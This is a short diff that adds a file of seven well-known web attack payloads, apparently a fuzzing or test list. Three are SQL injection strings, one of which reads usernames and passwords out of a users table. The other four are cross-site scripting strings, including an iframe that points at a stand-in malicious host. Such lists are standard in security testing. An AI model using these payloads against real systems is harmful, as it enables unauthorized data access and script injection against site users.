@@ -1,0 +1,7 @@
+' OR 1=1 --
+' UNION SELECT null, username, password FROM users --
+admin' OR '1'='1' --
+<iframe src="http://malicious.site" />
+<svg/onload=alert(1)>
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
